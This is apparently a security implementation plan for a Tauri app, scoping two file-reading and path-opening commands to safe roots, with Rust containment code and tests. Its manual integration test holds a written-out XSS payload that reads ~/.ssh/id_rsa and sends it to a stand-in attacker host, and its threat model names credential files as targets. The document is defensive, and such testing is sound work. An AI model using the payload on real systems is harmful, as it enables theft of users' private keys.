# Implementation Plan: Security — Tauri Path-Scope Guard

## 1) Goal

Restrict the two Tauri commands that take a `path: String` from the frontend to a small, well-defined set of safe roots:

- `read_file_as_base64` (`src-tauri/src/lib.rs:181`) — currently reads any file the frontend asks for.
- `open_path` (`src-tauri/src/lib.rs:188`) — currently hands any URL/path to the OS.

Both are reachable from the renderer. Combined with the `new Function` RCE (see `Implementation_Security_NoEvalOnModelOutput.md`) or any future XSS, they are arbitrary-file-read and arbitrary-URL-open primitives. After this plan, they are confined to the user's own vault, project textbook, and MathMate's session directory — with user confirmation for anything outside that.

This plan covers roadmap items **(3)** and **(4)**.

---

## 2) Threat Model (Practical)

- Adversary: prompt-injected model output reaching a Tauri command via the renderer.
- Capability sought: read `~/.ssh/id_rsa`, `~/.aws/credentials`, keychain exports, or open `https://attacker.example/` (or `file:///etc/passwd`) via the OS default handler.
- Mitigation: scope both commands to an explicit allowlist of roots; validate scheme + extension for `open_path`; prompt for non-vault paths.
- Out of scope: native-side Rust code that already takes only internal paths (session/project/textbook) — those are fine. CSP (separate plan).

---

## 3) Scope

### In scope
- New `pathscope` Rust module with `is_within(root, path)` containment check.
- `read_file_as_base64` rejects paths outside the project vault, project textbook, and `~/.mathmate/`.
- `open_path` rejects non-`file:` schemes, allowlists extensions (`.md`, `.pdf`, `.png`, `.jpg`, `.jpeg`, `.webp`, `.txt`, `.json`), and prompts the user for non-vault paths.
- Remove `shell:default` from `capabilities/default.json` if it remains unused after the change.
- Unit + integration tests for the scope check.

### Out of scope
- Tauri `fs:default` capability scope tightening (audited separately — see roadmap item "Lower-severity / hardening" #13).
- Network isolation for outbound HTTP (CSP covers that).

---

## 4) System Design

### 4.1 Allowlist of roots

A command is permitted only if its target is inside one of these canonicalized directories:

1. `project.vault_path` — the active project's Obsidian vault (per-session lookup; falls back to no-op if the session has no project).
2. `project.textbook_path` — the active project's textbook.
3. `~/.mathmate/sessions/<session_id>/images/` — session image attachments.
4. `~/.mathmate/projects/` — the projects metadata directory (for project icon / banner reads, if any are added).
5. Any directory the user explicitly opens via the native file picker (`dialog:open` returns a canonical path that we then cache in a per-process allowlist).

For `open_path`, an additional scheme allowlist applies:
- `file:` (after stripping the scheme) is permitted.
- No scheme (plain path) is permitted.
- Anything else (`http:`, `https:`, `javascript:`, `data:`, `ftp:`, `ssh:`, …) is rejected.

For both, an extension allowlist on `open_path` only:
- `.md .pdf .png .jpg .jpeg .webp .gif .txt .json .tex .csv`

### 4.2 Containment algorithm

Use canonical-path comparison. The classic trap is `..` traversal and symlinks:

```rust
fn is_within(root: &Path, target: &Path) -> bool {
    let Ok(root_canon) = std::fs::canonicalize(root) else { return false; };

    // Target may not exist yet: canonicalize parent then re-join filename.
    let target_canon = if let Ok(c) = std::fs::canonicalize(target) {
        c
    } else if let Some(parent) = target.parent() {
        let Ok(parent_canon) = std::fs::canonicalize(parent) else { return false; };
        match target.file_name() {
            Some(name) => parent_canon.join(name),
            None => return false,
        }
    } else {
        return false;
    };

    target_canon.starts_with(&root_canon)
}
```

Caveats:
- Always compare canonical `PathBuf`s and use `Path::starts_with` semantics (not raw string prefix checks) to avoid `Vault` vs `Vaultness` bugs.
- Symlinks inside the allowlisted root are fine. Symlinks pointing *out* resolve outside after canonicalization and are rejected.

### 4.3 User confirmation for non-vault paths

For `open_path`, if the canonical target is inside any allowlisted root, open it without prompting. If the path was returned by the native file picker (`dialog:open`) and is outside all roots, prompt: "Open `<path>` outside your vault? [Cancel] [Open]". Use `tauri-plugin-dialog`'s `ask` API.

### 4.4 Frontend contract change

The frontend continues to call the same two commands. Internally:
- `read_file_as_base64(path, project_id)` — new optional `project_id` parameter; if absent, default to the active project (looked up by the Tauri command from the AppState's session mapping).
- `open_path(path, project_id, confirmed?: bool)` — `confirmed: true` skips the dialog (used by the dialog flow itself and by Vault-context opens).

The frontend updates `lib/tauri.ts` types to match.

---

## 5) File-by-File Tickets

### S3E1 — `pathscope` module
**New:**
- `mathmate/src-tauri/src/pathscope.rs`

**Tasks:**
- Implement `pub fn is_within(root: &Path, target: &Path) -> bool`.
- Implement `pub fn canonical_inside_any(roots: &[PathBuf], target: &Path) -> bool` — tries each root, returns true on first hit.
- Implement `pub fn safe_extension(path: &Path) -> bool` — extension allowlist for `open_path`.
- Implement `pub fn normalize_local_path(raw: &str) -> Result<PathBuf, String>` — parses `file:` URLs (or plain paths) into local paths and rejects all non-local schemes.
- Unit tests:
  - `is_within('/Users/x/Vault', '/Users/x/Vault/notes/calc.md')` → `true`
  - `is_within('/Users/x/Vault', '/Users/x/Vaultness/notes/calc.md')` → `false` (prefix attack)
  - `is_within('/Users/x/Vault', '/Users/x/.ssh/id_rsa')` → `false`
  - `is_within('/tmp', '/tmp/../etc/passwd')` → `false` (canonicalize resolves to `/etc/passwd`)
  - `normalize_local_path('https://attacker/')` → `Err`
  - `normalize_local_path('file:///Users/x/Vault/notes.md')` → `Ok`
  - `safe_extension('foo.png')` → `true`, `safe_extension('foo.exe')` → `false`

### S3E2 — `read_file_as_base64` scope check
**Modify:**
- `mathmate/src-tauri/src/lib.rs:181`

**Tasks:**
- Resolve the active project (from a new `active_project_id` in `AppState` set when a project is selected in the UI).
- Build the list of allowed roots from the active project + the global `~/.mathmate/` root.
- Call `pathscope::canonical_inside_any` on the requested path.
- On `false`, return `Err(format!("Access denied: '{}' is outside allowed roots", path))`.
- On `true`, perform the read as before.
- Update the Tauri command signature to take `project_id: Option<String>` for explicitness.

### S3E3 — `open_path` scope check
**Modify:**
- `mathmate/src-tauri/src/lib.rs:188`

**Tasks:**
- Call `pathscope::normalize_local_path` on the input; reject non-local schemes.
- Call `pathscope::safe_extension` on the resulting path; reject disallowed extensions.
- Call `pathscope::canonical_inside_any` on the path; if outside all roots, call `tauri-plugin-dialog::ask` for confirmation.
- On `false`/cancel, return `Err`.
- On confirmed, spawn the platform-specific opener as before.
- Pass a `confirmed: bool` flag from the frontend to skip the dialog for paths the user just picked via `dialog:open`.

### S3E4 — Capabilities audit
**Modify:**
- `mathmate/src-tauri/capabilities/default.json`

**Tasks:**
- Verify `shell:default` is unused (no `tauri-plugin-shell` calls in `src-tauri/src/`). If so, remove it.
- Confirm `fs:default` scope is empty (no `tauri-plugin-fs` calls in renderer). If not, add a minimal scope or remove the permission.

### S3E5 — Frontend types
**Modify:**
- `mathmate/src/lib/tauri.ts`
- `mathmate/src/components/Sidebar.tsx` and any other caller of `read_file_as_base64` / `open_path`

**Tasks:**
- Update TypeScript signatures to include `projectId` and `confirmed`.
- Add a helper `openPathInVault(path)` that always passes `confirmed: true` for known-vault paths.

---

## 6) Testing Plan

### Unit (Rust)
- `pathscope` module tests as in §5/S3E1.
- Mock-based tests for `read_file_as_base64` returning `Err` on out-of-scope paths.

### Integration
- Manual: from a session, paste an `<img onerror="invoke('read_file_as_base64', {path: '/Users/<me>/.ssh/id_rsa', projectId: '...'}).then(b => fetch('https://attacker/?d=' + b))">` in a chat message (via DevTools). Confirm the invoke call returns `Err` and the request never fires.
- Manual: open a session whose project has a vault. Trigger `openPathInVault` for a note inside the vault — opens without prompt. Trigger for a file outside the vault — dialog appears, Cancel blocks, Open succeeds.
- Manual: try to open `https://attacker.example/` via the JS console — `Err`.

### CI
- `cargo check`, `cargo test`, `npm run build` all pass.

---

## 7) Acceptance Criteria

- [ ] `read_file_as_base64` returns `Err` for any path outside the active project's vault, textbook, and `~/.mathmate/`.
- [ ] `open_path` returns `Err` for non-`file:` schemes and disallowed extensions.
- [ ] `open_path` for a path outside the vault prompts the user via a native dialog.
- [ ] `open_path` for a path inside the vault opens without prompting.
- [ ] `capabilities/default.json` has `shell:default` removed (if unused).
- [ ] Unit + integration tests for `pathscope` pass.
- [ ] Existing flows (clicking a note in the vault browser, opening a textbook, viewing an attached image) all still work.
- [ ] CHANGELOG and dev log updated.

---

## 8) Rollout Plan

1. Land `pathscope` module with unit tests.
2. Update `read_file_as_base64` and `open_path` to use it; tighten capabilities.
3. Update frontend callsites to pass `projectId` / `confirmed`.
4. Dogfood: open a vault, click a note (no prompt); click a file outside the vault (prompt appears); try a malicious `invoke` from DevTools (rejected).
5. CHANGELOG entry: "Changed (Security): Tauri commands `read_file_as_base64` and `open_path` are now scoped to the active project's vault, textbook, and MathMate data directory. Non-vault opens require user confirmation."
